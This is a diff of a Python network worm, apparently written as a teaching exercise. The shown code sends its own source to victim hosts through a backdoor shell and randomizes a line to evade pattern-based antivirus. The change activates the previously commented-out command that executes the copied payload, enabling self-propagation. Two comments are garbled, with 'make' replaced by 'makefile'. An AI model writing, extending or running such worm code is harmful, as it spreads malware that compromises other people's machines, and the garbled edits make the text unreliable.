@@ -5,7 +5,7 @@
 # try to do one or more of the following:
 # 1) Try to improve the functionality
 # 2) Try to implement the functionality of the script into one or more classes
-# 3) Try to make sure the worm is not able to infect an already infected machine
+# 3) Try to makefile sure the worm is not able to infect an already infected machine
 
 import ifaddr
 import netaddr
@@ -106,7 +106,7 @@ def exploit(targets):
         try:
             # Self replication is done through the backdoor shell opened by the previous try/catch block.
             # When replicating it self the worm will take it's own source code (__file__) and replace the second
-            # line of the code with a random string, this is to make it harder for pattern based antivirus
+            # line of the code with a random string, this is to makefile it harder for pattern based antivirus
             # to catch the file. When the file has been successfully replicated to the victim host it is made
             # executable and then executed on the system.
             backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -130,8 +130,8 @@ def exploit(targets):
             command = str.encode('chmod +x /usr/local/bin/har.py\n'.format(line))
             backdoor.send(command)
 
-            #command = str.encode('python3 /usr/local/bin/har.py &\n'.format(line))
-            #backdoor.send(command)
+            command = str.encode('python3 /usr/local/bin/har.py &\n'.format(line))
+            backdoor.send(command)
 
             debug_message('[*] Payload uploaded and executed')
 
